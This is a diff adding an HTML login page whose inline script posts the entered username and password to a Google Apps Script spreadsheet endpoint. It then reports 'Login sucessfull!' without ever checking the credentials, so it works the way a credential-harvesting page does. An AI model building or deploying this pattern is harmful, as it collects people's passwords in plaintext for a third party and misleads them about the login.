@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Login form</title>
+
+	<!--=============== CSS ===============-->
+	<link rel="stylesheet" type="text/css" href="main.css">
+
+	<!--=============== ICON ===============-->
+	<link rel="icon" type="images" href="lg.png">
+
+	<!--=============== REMIXICONS ===============-->
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
+
+</head>
+<body>
+
+<section>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+
+</section>
+
+<div class="form-container">
+
+	<p class="title">Login</p>
+
+	<form name="submit-to-google-sheet" class="form">
+
+		<div class="input-group">
+
+			<input type="text" name="username"  placeholder="" required>
+			<label for="username">Username</label>
+			
+		</div>
+<br>
+		<div class="input-group">
+
+			<input type="password" name="password"  placeholder="" required>
+			<label for="password">Password</label>
+			
+
+			<div class="forgot">
+				<a rel="noopener noreferrer" href="#">Forgot Password ?</a>
+			</div>
+
+		</div>
+
+		<button type="submit" class="sign">Sign in</button>
+
+	</form>
+
+	<span id="msg"></span>
+
+	<div class="social-message">
+
+		<div class="line"></div>
+
+		<p class="message">Login with social accounts</p>
+
+		<div class="line"></div>
+
+	</div>
+
+	<div class="social-icons">
+	
+			<a href="https://accounts.google.com" target="_blank"><i class="ri-google-line"></i></a>
+
+			<a href="https://www.facebook.com" target="_blank"><i class="ri-facebook-circle-fill"></i></a>
+
+		    <a href="https://github.com" target="_blank"><i class="ri-github-fill"></i></a>
+	
+	</div>
+
+	<p class="signup">Don't have an account?
+		<a href="#" class="">Sign up</a>
+	</p>
+
+</div>
+
+
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbyWoxoriWBI2VaFZB_OlRWEYA2UbV-VRf70_ngvek0_lUxx4DNRwu35B-UHXMt2Q8od/exec'
+ const form = document.forms['submit-to-google-sheet']
+  const msg = document.getElementById('msg')
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => {
+      	msg.innerHTML = "Login sucessfull!"
+      	setTimeout(function(){
+      		msg.innerHTML = ""
+      	},5000)
+      	form.reset()
+      })
+      .catch(error => console.error('Error!', error.message))
+  });
+</script>
+
+</body>
+</html>
